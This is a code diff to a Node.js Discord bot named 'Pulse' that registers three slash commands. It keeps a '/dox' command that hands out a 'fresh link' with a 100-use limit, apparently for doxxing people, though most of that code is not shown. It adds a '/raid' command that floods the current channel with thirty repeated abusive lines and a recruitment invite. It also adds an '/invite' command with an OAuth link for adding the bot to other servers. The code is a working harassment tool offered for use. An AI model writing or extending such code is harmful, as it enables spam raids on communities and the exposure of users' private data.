@@ -7,12 +7,15 @@ const app = express();
 const TOKEN = process.env.TOKEN;
 const CHANNEL_ID = process.env.CHANNEL_ID;
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
+const INVITE_LINK = process.env.INVITE_LINK || 'https://discord.gg/hW3djeNKu';
 const PORT = process.env.PORT || 3000;
 
 // ---- MINIMAL INTENTS ----
 const client = new Client({
     intents: [
-        GatewayIntentBits.Guilds
+        GatewayIntentBits.Guilds,
+        GatewayIntentBits.MessageContent,
+        GatewayIntentBits.GuildMessages
     ],
 });
 
@@ -43,16 +46,25 @@ app.listen(PORT, () => {
 // ---- DISCORD BOT ----
 client.once('ready', () => {
     console.log(`🤖 Logged in as ${client.user.tag}`);
-    client.application.commands.create({
-        name: 'dox',
-        description: 'Generate a fresh link',
-    })
-    .then(() => console.log('✅ Slash command registered'))
-    .catch(err => console.error('❌ Failed to register command:', err));
+    
+    // Register slash commands
+    const commands = [
+        { name: 'dox', description: 'Generate a fresh link' },
+        { name: 'raid', description: 'Flood the channel with a raid message' },
+        { name: 'invite', description: 'Get an invite link for Pulse' }
+    ];
+    
+    commands.forEach(cmd => {
+        client.application.commands.create(cmd)
+            .then(() => console.log(`✅ Slash command registered: /${cmd.name}`))
+            .catch(err => console.error(`❌ Failed to register /${cmd.name}:`, err));
+    });
 });
 
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
+
+    // ---- DOX COMMAND ----
     if (interaction.commandName === 'dox') {
         await interaction.deferReply({ ephemeral: true });
 
@@ -74,6 +86,45 @@ client.on('interactionCreate', async (interaction) => {
             .setFooter({ text: 'Expires after 100 links generated' });
 
         await interaction.editReply({ embeds: [embed] });
+    }
+
+    // ---- RAID COMMAND ----
+    if (interaction.commandName === 'raid') {
+        await interaction.deferReply({ ephemeral: true });
+
+        const channel = interaction.channel;
+        if (!channel) {
+            return interaction.editReply('❌ This command can only be used in a server channel.');
+        }
+
+        // Build the raid message
+        const spamLines = [];
+        for (let i = 0; i < 30; i++) {
+            spamLines.push('THIS SERVER FUCKING SUCKS PULSE OWNS ALL OF YOU');
+        }
+        spamLines.push(`Join Pulse today to get this raid: ${INVITE_LINK}`);
+        
+        const raidMessage = spamLines.join('\n');
+
+        // Send the raid message (split into chunks if needed)
+        try {
+            await channel.send(raidMessage);
+            await interaction.editReply('✅ Raid sent successfully.');
+        } catch (error) {
+            console.error('Raid failed:', error);
+            await interaction.editReply('❌ Failed to send raid. Check bot permissions.');
+        }
+    }
+
+    // ---- INVITE COMMAND ----
+    if (interaction.commandName === 'invite') {
+        const embed = new EmbedBuilder()
+            .setTitle('📩 Invite Pulse')
+            .setColor(0x8B5CF6)
+            .setDescription(`[➕ Add Bot to Your Server](https://discord.com/oauth2/authorize?client_id=1545939378361081916)`)
+            .setFooter({ text: 'Click the link above to invite' });
+
+        await interaction.reply({ embeds: [embed] });
     }
 });
 
